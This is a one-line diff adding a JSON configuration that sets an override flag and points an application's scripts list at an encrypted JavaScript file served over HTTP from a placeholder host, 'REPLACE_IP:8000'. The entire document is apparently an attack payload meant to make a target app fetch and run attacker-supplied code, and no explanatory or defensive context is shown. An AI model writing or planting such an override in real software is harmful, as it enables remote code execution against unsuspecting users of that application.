@@ -1,0 +1,1 @@
+{"app_version":"1.29","override":true,"scripts":[{"src":"http://REPLACE_IP:8000/serve.js.aes","version":"555"}]}
